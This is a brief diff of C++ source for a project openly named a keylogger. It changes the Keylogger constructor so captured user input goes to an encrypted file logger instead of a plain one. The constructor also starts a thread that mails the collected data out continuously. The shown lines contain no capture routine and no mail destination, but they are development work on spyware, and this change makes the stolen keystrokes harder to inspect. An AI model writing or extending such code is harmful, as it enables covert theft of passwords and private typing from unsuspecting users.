@@ -6,7 +6,7 @@ namespace keylogger
 {
 Keylogger::Keylogger(std::unique_ptr<mail::MailSender> mailSenderInit,
                      std::unique_ptr<KeyboardProcessor> keyboardProcessorInit,
-                     std::unique_ptr<UserInputFileLogger> userInputFileLoggerInit)
+                     std::unique_ptr<UserInputEncryptedFileLogger> userInputFileLoggerInit)
     : mailThread{&Keylogger::sendMailContinuously, this},
       mailSender{std::move(mailSenderInit)},
       keyboardProcessor{std::move(keyboardProcessorInit)},
